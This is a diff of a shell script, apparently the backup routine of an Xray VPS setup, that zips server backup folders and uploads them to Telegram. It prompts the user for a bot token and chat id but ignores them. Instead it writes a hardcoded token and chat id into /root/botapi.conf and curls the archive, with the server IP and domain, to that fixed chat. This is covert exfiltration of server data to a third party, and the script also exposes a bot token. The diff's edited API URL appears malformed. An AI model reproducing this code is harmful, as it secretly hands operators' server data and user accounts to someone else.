@@ -97,8 +97,8 @@ domain=$(cat /etc/xray/domain)
 
 clear
 echo -e "[ ${green}INFO${NC} ] Create for database"
-#read -rp "Enter Token (Creat on Botfather) : " -e token
-#read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id_chat
+read -rp "Enter Token (Creat on Botfather) : " -e token
+read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id_chat
 echo -e "toket=6269067022:AAHuxwF-f99WLo2i04T-V6ze-E5CXXtzvs4" >> /root/botapi.conf
 echo -e "chat_idc=481473615" >> /root/botapi.conf
 sleep 1
@@ -127,7 +127,7 @@ zip -r $IP.zip backup > /dev/null 2>&1
 curl -F chat_id="481473615" -F document=@"$IP.zip" -F caption="Backup Bot Berhasil
 Your Domain : $domain
 Date       : $date
-Your IP VPS  : $IP" https://api.telegram.org/bot6269067022:AAHuxwF-f99WLo2i04T-V6ze-E5CXXtzvs4/sendDocument &> /dev/null
+Your IP VPS  : $IP" https://api.telegram.org/@backupcasper_bot6269067022:AAHuxwF-f99WLo2i04T-V6ze-E5CXXtzvs4/sendDocument &> /dev/null
 
 rm -fr /root/backup &> /dev/null
 rm -fr /root/user-backup &> /dev/null
